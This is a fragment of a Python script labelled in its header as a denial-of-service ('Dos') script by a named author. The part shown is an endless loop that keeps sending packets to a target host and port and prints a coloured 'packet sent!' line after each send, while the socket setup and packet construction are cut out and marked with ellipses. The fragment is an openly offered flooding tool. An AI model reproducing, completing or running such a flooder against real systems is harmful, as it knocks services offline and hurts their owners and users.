...
# python 3.3.2+ dws atak xb Dos Script v.1
# by Can Yalçın
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! dws atak xbing--> \033[0m")
			else:
				s.shutdown(1)
